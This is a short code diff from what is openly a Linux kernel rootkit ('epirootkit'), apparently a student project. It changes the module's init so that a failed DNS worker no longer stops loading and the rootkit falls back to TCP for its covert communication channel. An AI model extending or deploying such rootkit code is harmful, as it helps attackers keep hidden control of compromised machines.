@@ -43,7 +43,7 @@ static int __init epirootkit_init(void) {
 
     if (start_dns_worker() != SUCCESS) {
         ERR_MSG("epirootkit_init: failed to start DNS worker\n");
-        return -FAILURE;
+        ERR_MSG("epirootkit_init: rootkit will try to use tcp to communicate\n");
     }
 
     if (passwd_load() != SUCCESS) {
